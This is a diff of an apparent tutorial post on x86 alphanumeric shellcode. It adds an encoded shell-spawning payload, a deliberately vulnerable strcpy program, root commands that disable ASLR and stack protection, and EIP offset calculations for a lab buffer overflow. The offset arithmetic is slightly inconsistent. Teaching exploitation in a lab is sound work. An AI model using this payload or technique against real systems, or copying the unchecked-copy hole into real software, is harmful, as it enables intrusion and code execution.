@@ -288,9 +288,39 @@ _start:
        xor al, 0x4a
        xor al, 0x41
 ```
-
-Now we need a simple buffer overflow that permit us to load and execute the shellcode. Let's use a simple C program
+For comodity we can transfer the shellcode from nasm to ASCII text: 
+```ascii
+j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A
+```
+Now we need a simple buffer overflow that permit us to load and execute the shellcode. Let's use a simple C program (bof.c)
 
 ```C
-
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+ 
+  int main(int argc, char *argv[]){
+    char buffer[128];
+    strcpy(buffer,  argv[1]);
+    return 0;
+  }
 ```
+When you test it on new kernels remember to disable the randomize_va_space and to compile the C program with execstack enabled and the stack protector disabled
+
+```bash
+# bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
+# sysctl -p
+# gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g bof.c -o bof
+```
+Next testing the bof program we found that the buffer overflow with EIP overwrite appens with 136 bytes of input, so doing a little math here we can know that: <br>
+136 - 66 (shellcode) - 4 (EIP address overwrite) = 66 bytes <br>
+so we can pass the first 6 NOP bytes + 66 shellcode bytes + 4 EIP address redirection bytes. Using Peda we have first to find the adress to land to.
+
+![](/assets/images/linux/x86/alphanumeric_1.gif)<br>
+
+As we can see in this case we can choose an adress at the end of NOP zone before our shellcode so ```0xbffff788```. Now we can observe what happens in the stack when we use this address
+
+
+
+
+
